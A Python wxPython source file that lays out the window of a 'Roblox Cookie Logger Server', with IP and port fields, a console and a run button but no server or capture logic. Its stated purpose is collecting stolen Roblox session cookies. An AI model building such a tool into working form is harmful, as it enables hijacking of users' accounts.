import wx


class GUIserver(wx.Frame):
    def __init__(self, *args, **kwds):
        ''' initialing '''
        kwds["style"] = kwds.get("style", 0) | wx.DEFAULT_FRAME_STYLE
        wx.Frame.__init__(self, *args, **kwds)
        self.SetSize((600, 400))

        self.panel = wx.Panel(self, wx.ID_ANY)

        ''' text ctrls '''
        self.tbIP = wx.TextCtrl(self.panel, wx.ID_ANY,
                                'localhost', style=wx.TE_PROCESS_ENTER)
        self.tbPORT = wx.TextCtrl(
            self.panel, wx.ID_ANY, "8888", style=wx.TE_PROCESS_ENTER)

        ''' Console '''
        self.tbConsole = wx.TextCtrl(
            self.panel, wx.ID_ANY, "", style=wx.TE_MULTILINE | wx.TE_READONLY | wx.TE_CENTRE, size=(-1, 200), pos=(0, 0), name="tbConsole")
        self.tbConsole.BackgroundColour = "black"
        self.tbConsole.ForegroundColour = "white"
        self.tbConsole.SetFont(wx.Font(
            10, wx.FONTFAMILY_DEFAULT, wx.FONTSTYLE_NORMAL, wx.FONTWEIGHT_NORMAL, False, "Consolas"))

        ''' buttons '''
        self.btnToggleRun = wx.Button(
            self.panel, wx.ID_ANY, "Run  Server")

        self.__set_properties()
        self.__do_layout()

    def __set_properties(self):
        self.SetTitle("[GUI] Roblox Cookie Logger Server")
        self.SetBackgroundColour(wx.Colour(255, 255, 255))
        self.panel.SetBackgroundColour(wx.Colour(255, 255, 255))

    def __do_layout(self):
        sizer_1 = wx.BoxSizer(wx.VERTICAL)
        sizer_2 = wx.BoxSizer(wx.VERTICAL)

        ''' ip && port '''
        tbGrid = wx.FlexGridSizer(2, 2, 0, 0)

        lblIP = wx.StaticText(self.panel, wx.ID_ANY, "IP")
        lblPORT = wx.StaticText(self.panel, wx.ID_ANY, "PORT               ")

        tbGrid.AddMany(
            [
                (lblIP, 0, 0, 5),
                (self.tbIP, 1, wx.ALL | wx.EXPAND, 0),
                (lblPORT, 0, 0, 5),
                (self.tbPORT, 1, wx.TOP | wx.EXPAND, 0),
            ]
        )

        tbGrid.AddGrowableCol(1)

        sizer_2.Add(tbGrid, 0, wx.EXPAND, 0)

        ''' console '''
        lbConsole = wx.StaticText(self.panel, wx.ID_ANY, "Console")
        sizer_2.Add(lbConsole, 0, wx.TOP, 0)
        sizer_2.Add(self.tbConsole, 1, wx.EXPAND, 0)

        ''' buttons '''
        sizer_2.Add(self.btnToggleRun, 0, wx.ALL | wx.EXPAND, 5)

        ''' main '''
        self.panel.SetSizer(sizer_2)

        sizer_1.Add(self.panel, 1, wx.ALL | wx.EXPAND, 5)
        self.SetSizer(sizer_1)
        self.Layout()


class MyApp(wx.App):
    def OnInit(self):
        self.Window = GUIserver(None, wx.ID_ANY, "", )
        self.SetTopWindow(self.Window)
        self.Window.Show()
        return True


if __name__ == "__main__":
    app = MyApp(0)
    app.MainLoop()
